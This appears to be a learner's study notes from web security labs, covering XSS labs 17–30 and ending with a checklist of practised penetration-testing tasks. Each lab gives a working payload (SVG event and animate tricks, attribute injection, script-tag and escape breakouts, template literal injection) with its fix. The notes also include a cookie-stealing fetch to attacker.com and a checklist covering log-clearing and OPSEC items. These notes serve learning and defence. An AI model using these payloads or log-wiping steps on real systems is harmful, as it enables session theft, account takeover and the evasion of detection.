sink: HTML/SVG response
context: HTML/SVG context
WAF: blocks common HTML tags and most event handlers
     allows SVG elements and some SVG-specific events
breakout: no — inject directly as SVG markup
interpreter: HTML parser then SVG parser

SVG attack chain:
SVG is markup not just images — SVG elements have attributes and events
animateTransform — SVG animation element — starts automatically on render
onbegin — fires when SVG animation begins — no user interaction needed

allowed elements: svg, circle, animateTransform
allowed event: onbegin

final payload:
<svg>
  <rect width="50" height="50">
    <animateTransform attributeName="transform" type="rotate"
      from="0" to="360" dur="2s" onbegin="alert(1)">
    </animateTransform>
  </rect>
</svg>

attack chain:
animateTransform starts automatically → onbegin fires → alert(1) executes

key lesson: SVG has its own events not in standard HTML event lists
            WAF enumeration should include SVG-specific elements and events
            attack surface is larger than just HTML tags

why it exists: blacklist missed SVG-specific attack surface
fix: contextual output encoding — allowlist SVG sanitizer if SVG required

Lab 17 XSS — Reflected XSS in canonical link tag — DONE
type: reflected XSS
source: test URL parameter
sink: href attribute of canonical link element
context: double-quoted HTML attribute value context
encoding: angle brackets encoded — attribute injection still possible
breakout: yes — escape href attribute with '
interpreter: HTML parser
note: only works in Chrome — Chrome-specific behavior

canonical link tag context:
<link rel="canonical" href="https://site.com/?USER_INPUT">
angle brackets blocked — cannot inject new elements
but quotation marks not blocked — attribute injection possible

accesskey technique:
accesskey attribute associates element with keyboard shortcut
inject accesskey + onclick into the existing link element
simulated user activates keyboard shortcut → onclick fires

payload: ?'accesskey='x'onclick='alert(1)'
result in HTML: href="..." accesskey='x' onclick='alert(1)'

attack chain:
attribute injection → accesskey=x → keyboard shortcut pressed → onclick → alert(1)

key lessons:
encoding angle brackets does not prevent attribute injection
always check if quotation marks are also encoded
accesskey works on any HTML element including link
onclick on link fires when element is activated via accesskey
check lab notes for browser restrictions — some techniques are browser-specific

why it exists: quotes not encoded — attribute context breakout possible
fix: encode quotes alongside angle brackets in attribute context

Lab 18 XSS — Reflected XSS — JS string with ' and \ escaped — DONE
type: reflected XSS
source: search parameter
sink: var searchTerms = 'USER_INPUT'
context: JavaScript string inside script tag
encoding: ' escaped, \ escaped, angle brackets ALLOWED
key insight: when JS string is locked down — attack the HTML layer instead
             close the script tag, open a new one
payload: </script><script>alert(1)</script>
reasoning: HTML parser sees </script> and closes the script block
           new <script> tag opens fresh JS context
           no need to break out of the string at all
why it exists: angle brackets not encoded inside script context
fix: encode < and > inside script context, use JSON encoding for data

Lab 19 XSS — Reflected XSS — JS string with angle brackets encoded and ' escaped — DONE
type: reflected XSS
source: search parameter
sink: var searchTerms = 'USER_INPUT'
context: JavaScript string inside script tag
encoding: < > " encoded, ' escaped, \ ALLOWED
key insight: backslash neutralizes the escape before the single quote
payload: \';alert(1);//
reasoning:
  server escapes ' to \'
  injecting \ before ' makes it \\' — backslash is escaped, quote is free
  ' then closes the JS string
  ; terminates statement
  alert(1); injects code
  // comments remainder
why it exists: backslash not escaped — escaping mechanism manipulated
fix: escape both ' and \ — neither should pass through raw

Lab 20 XSS — Stored XSS into onclick via HTML entity encoding — DONE
type: stored XSS
source: comment author website field
sink: onclick event handler — single-quoted JS string inside href
context: single-quoted JavaScript string inside HTML attribute onclick
encoding: < > " encoded, ' escaped, \ escaped
key insight: HTML entities are decoded by HTML parser BEFORE JS executes
             ' is escaped but &#x27; passes through and is decoded to ' at runtime
payload: &#x27;);alert(1);//
reasoning:
  &#x27; is HTML entity for '
  HTML parser decodes it to ' before onclick JS is interpreted
  ' closes the JS string
  ); closes the function call
  alert(1); injects code
  // comments remainder
two-parser bypass: HTML parser decodes entity → JS parser sees raw '
why it exists: JS escaping applied but HTML entity encoding not considered
fix: apply both JS escaping AND HTML encoding — understand parser order

Lab 21 XSS — Reflected XSS into template literal — DONE
type: reflected XSS
source: search parameter
sink: var message = backtick 0 search results for '${USER_INPUT}' backtick
context: JavaScript template literal
encoding: < > ' " \ backtick all Unicode-escaped
breakout: no — already inside expression interpolation context
key insight: template literals evaluate ${...} as JS expressions
             no escaping needed — just inject inside ${}
payload: ${alert(1)}
analogy: same as Python f-strings — ${} evaluates JavaScript
reasoning: ${} creates an expression slot inside the template literal
           injecting alert(1) inside ${} executes it directly
why it exists: untrusted input inside template literal — ${} not escaped
fix: never place untrusted input inside template literals
     use safe serialization — JSON.stringify before embedding

template literal syntax:
backtick string backtick — uses backticks not quotes
${expression} — evaluates any JS expression inline
similar to Python f-strings: f"{variable}"

XSS cookie stealing concept:
<script>fetch('https://attacker.com?c='+document.cookie)</script>
stored in comment → fires for every visitor → cookies sent to attacker
cookies contain session tokens → attacker logs in as victim

XSS credential stealing concept:
inject fake login form via XSS
victim types credentials into attacker-controlled form
credentials sent to attacker server via fetch()
requires: external server to receive data (Burp Collaborator, webhook.site, VPS)

Labs 22-23: watched only — require Burp Collaborator (Pro feature)
concept understood — will practice in real bug bounty with own server

Lab 24 XSS — Exploiting XSS to bypass CSRF defenses — DONE (tutorial)
concept: XSS on same origin can read CSRF tokens from the DOM
         CSRF protection becomes useless when XSS exists on the same site
attack chain:
  stored XSS fires in victim browser
  → JavaScript reads CSRF token from page DOM
  → fetch() sends forged request with stolen token
  → server accepts it because token is valid
  → victim's email changed

key lesson: XSS + CSRF = complete account takeover
            fixing XSS automatically fixes CSRF bypass
            CSRF protection only works when attacker cannot read page content
            
Lab 25 XSS — AngularJS sandbox escape without strings — WATCHED ONLY
concept: AngularJS sandbox restricts which JS expressions can execute
         bypass requires using AngularJS internals without $eval or strings
         uses constructor chains and array methods to reach Function()
real bug bounty approach:
  identify AngularJS version
  search HackTricks → AngularJS sandbox escape
  try known payloads for that version
  adapt based on what is filtered
resources:
  HackTricks: AngularJS sandbox escape
  PayloadsAllTheThings: XSS injection
key lesson: framework-specific attacks require framework knowledge
            look up known techniques — do not reinvent from scratch
            
Lab 26 XSS — AngularJS sandbox escape + CSP bypass — WATCHED ONLY
type: reflected XSS
source: search parameter
context: AngularJS expression context inside CSP-protected page
WAF/protection: CSP blocks inline scripts and external resources
                AngularJS sandbox restricts expression evaluation

two layers of protection:
layer 1: CSP — prevents inline script execution and external resource loading
layer 2: AngularJS sandbox — restricts which expressions can execute

why this is expert level:
requires knowing AngularJS internals deeply
requires understanding CSP directives and finding allowed bypass paths
combines two separate bypass techniques simultaneously

concept understood from video:
CSP bypass uses AngularJS itself as an allowed script source
since AngularJS is whitelisted by CSP, its expression evaluator runs
sandbox escape uses constructor chains to reach Function() constructor
Function() can execute arbitrary JavaScript even inside the sandbox

real bug bounty approach:
identify AngularJS version on target
search HackTricks — AngularJS sandbox escape payloads by version
check CSP header — identify what is whitelisted
look for whitelisted scripts that can be abused as gadgets

key lesson:
CSP is only as strong as what it whitelists
if a whitelisted script has dangerous evaluation behavior
that script becomes the bypass vector
AngularJS is a known CSP bypass gadget when whitelisted

resources:
HackTricks: AngularJS sandbox escape
PortSwigger: CSP bypass techniques
PayloadsAllTheThings: XSS CSP bypass

fix: do not whitelist AngularJS in CSP if possible
     use strict-dynamic CSP directive
     upgrade or remove AngularJS from production applications
  
Lab 27 XSS — Reflected XSS with event handlers and href blocked — DONE
type: reflected XSS
source: search parameter
sink: HTML/SVG context
context: SVG context
WAF: event handlers blocked, a href blocked
     allowed: svg, a, animate elements
breakout: no

SVG animate attribute modification technique:
animate element can modify attributes of other SVG elements
used to set href on <a> element to javascript: URL
avoids needing event handlers entirely

payload:
<svg>
  <a>
    <text x="10" y="30">Click me</text>
    <animate attributeName="href" values="javascript:alert(1)">
    </animate>
  </a>
</svg>

attack chain:
reflected input → svg → animate modifies a href →
href becomes javascript:alert(1) → user clicks → alert fires

key lessons:
blocking on* events does not prevent all XSS
SVG animate can modify element attributes dynamically
attack delivery and execution can be separate mechanisms
enumeration of allowed attributes is as important as allowed tags

why it exists: SVG animation functionality not considered in WAF rules
fix: contextual output encoding — allowlist SVG sanitizer 

Lab 28 XSS — Reflected XSS in JavaScript URL with blocked characters — WATCHED ONLY
type: reflected XSS
source: search parameter
context: JavaScript URL context
protection: certain characters blocked to prevent XSS
concept: input reflected inside a javascript: URL
         blocked characters force use of alternative JS syntax
         throw statement can be used with onerror handler
         allows calling alert with a string argument without parentheses containing blocked chars
key technique: javascript:throw/onerror combination to bypass character filtering
real bug bounty: search for javascript: URL reflection points
                 enumerate which characters are blocked
                 use HackTricks JS URL bypass payloads
why it exists: character blacklist instead of proper URL scheme validation
fix: validate URL schemes — only allow http: and https:

Lab 29 XSS — Reflected XSS protected by strict CSP with dangling markup — WATCHED ONLY
type: XSS / form hijacking
source: reflected input
context: HTML context with strict CSP
protection: strict CSP prevents script execution and external resource loading
concept: dangling markup attack
         when script execution is blocked by CSP
         inject unclosed HTML tags to capture page content
         dangling img tag with src pointing to attacker server
         browser completes the tag by consuming subsequent page HTML
         CSRF token gets sent to attacker as part of the URL
requires: Burp Collaborator to receive exfiltrated data
attack chain:
  inject unclosed tag → browser captures CSRF token in URL →
  sends it to attacker server → attacker uses token to change victim email
key lesson: CSP that blocks scripts does not prevent all data exfiltration
            dangling markup works even when JavaScript is fully blocked
why it exists: CSP not strict enough to prevent all injection attacks
fix: use strict CSP with nonces, sanitize all reflected input

Lab 30 XSS — Reflected XSS protected by CSP with CSP bypass — WATCHED ONLY
type: reflected XSS
source: reflected input
context: CSP-protected page
protection: CSP restricts script execution
concept: CSP bypass using script-src with JSONP or trusted endpoints
         some CSP policies whitelist domains that serve user-controlled content
         attacker finds a whitelisted endpoint that reflects their input
         uses that endpoint as a script source to execute arbitrary JS
note: intended solution only works in Chrome
requires: identifying a whitelisted domain with a JSONP or open redirect endpoint
key lesson: CSP is only as strong as what it whitelists
            any whitelisted domain with dangerous behavior breaks CSP
real bug bounty: check CSP header for whitelisted domains
                 test each whitelisted domain for JSONP endpoints
                 search: site:whitelisted-domain.com jsonp callback
why it exists: CSP whitelist includes domains with exploitable endpoints
fix: use strict-dynamic CSP with nonces instead of domain whitelists                            

======================================================
THINGS I STILL NEED TO PRACTICE
======================================================

[ ] ssh-keygen and ssh-copy-id — generate and deploy key pair
[ ] stealth scan practice — Stage 3
[ ] port forwarding — Stage 4

[x] disable history — DONE
[x] clear bash history file — DONE
[x] surgical log clean by IP and username — DONE
[x] full OPSEC routine from memory — DONE
[x] find private keys on Metasploitable — DONE
[x] find SUID binaries and research privesc paths — DONE
[x] find world-writable files excluding /proc — DONE
[x] run route -n and understand routing table — DONE
[x] send raw HTTP GET via netcat — DONE
[x] manual FTP session with netcat — DONE
[x] transfer file Kali to Metasploitable via Python HTTP server — DONE
[x] transfer file via netcat both directions — DONE
[x] run crontab -l and cat /etc/crontab — DONE
[x] run nmap -sC and read script output — DONE
[x] run nmap -sV and identify all services — DONE
[x] find PHP config files with credentials — DONE
[x] connect to bindshell port 1524 — instant root — DONE
[x] VNC access with default credentials — DONE
[x] MySQL direct access no password — DONE
[x] SMTP username enumeration — DONE
[x] rexec banner grab — DONE
[x] list users with real shells — DONE
[x] SSH into Metasploitable — DONE
[x] read auth.log live while SSHing in — DONE
[x] grep failed and accepted logins from auth.log — DONE
[x] built 12+ Python tools from scratch — DONE
[x] set up GitHub and pushed all tools — DONE
[x] SQLi complete — 14 labs done — DONE
[x] XSS labs 1-11 done with structured methodology — DONE
